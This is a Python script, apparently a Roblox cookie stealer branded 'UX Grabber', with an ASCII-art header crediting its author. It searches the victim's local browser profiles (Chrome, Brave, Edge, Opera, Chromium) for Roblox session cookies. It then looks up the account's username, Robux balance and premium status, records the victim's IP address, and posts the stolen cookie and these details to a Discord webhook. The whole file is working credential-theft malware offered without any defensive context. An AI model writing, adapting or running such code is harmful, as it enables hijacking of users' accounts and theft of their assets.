



#  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗██╗░░░██╗███╗░░██╗██╗██╗░░██╗--
 # ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝██║░░░██║████╗░██║██║╚██╗██╔╝--
#  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░██║░░░██║██╔██╗██║██║░╚███╔╝░--
#  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░██║░░░██║██║╚████║██║░██╔██╗░--
#  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░╚██████╔╝██║░╚███║██║██╔╝╚██╗-
#  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝---
#                        github.com/ScriptUnix 

                        # Credit me lol or die
 
 import browser_cookie3, requests, threading, os
                                                              
webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

ip = "http://ip-api.com/json/"
r = requests.get(ip)
adrs = r.json()["query"]

def sendCookie(cookie):
    authorization = {
        "Cookie": ".ROBLOSECURITY={}".format(cookie) 
    }

    url = "https://www.roblox.com/mobileapi/userinfo"
    jsonData = requests.get(url, headers=authorization).json()

    userid = jsonData["UserID"]
    username = jsonData["UserName"]
    robux = jsonData["RobuxBalance"]
    AVicon = jsonData["ThumbnailUrl"]
    premium = jsonData["IsPremium"]

    created = "https://users.roblox.com/v1/users/{}".format(userid)
    t = requests.get(created)
    time = t.json()["created"]
    creation = time.split("T")[0]

    data = {
    "content": "@everyone",
    "embeds": [{
    "title": "Profile",
    "description": cookie,
    "url": "https://www.roblox.com/users/{}/profile".format(userid),
    "footer": {
        "text": "UX Grabber",
        "icon_url": "https://iili.io/HBpFX2a.jpg"
    },
    "fields": [
        {
            "name": "IP",
            "value": adrs,
            "inline": True
        },
        {
            "name": "Username",
            "value": username,
            "inline": True
        },
        {
            "name": "ID",
            "value": userid,
            "inline": True
        },
        {
            "name": "Robux",
            "value": robux,
            "inline": True
        },
        {
            "name": "Created",
            "value": creation,
            "inline": True
        },
        {
            "name": "Premium",
            "value": premium,
            "inline": True
        },
    ],
    "author": {
        "name": "UX Grabber",
        "icon_url": "https://iili.io/HBpFX2a.jpg"
    },
    "color": "3447003",
    "thumbnail": {
        "url": AVicon,
            }
        }]
    }  
    
    requests.post(webhook, json=data)

directory = os.path.join(os.path.expandvars("%userprofile%"),"AppData\\Local")

for dirpath, dirnames, filenames in os.walk(directory):
    for filename in [f for f in filenames if f.startswith("Cookies")]:
        check = os.path.join(dirpath, filename)
        if not check.endswith("journal"):
            if "Google" in check:
                cookies = browser_cookie3.chrome(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
            elif "Brave" in check:
                cookies = browser_cookie3.brave(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
            elif "Edge" in check:
                cookies = browser_cookie3.edge(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
            elif "Opera" in check:
                cookies = browser_cookie3.opera(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
            elif "Chromium" in check:
                cookies = browser_cookie3.chromium(cookie_file=check, domain_name="roblox.com")
                for cookie in cookies:
                    if "_|WARNING:" in cookie.value:
                        sendCookie(cookie.value)
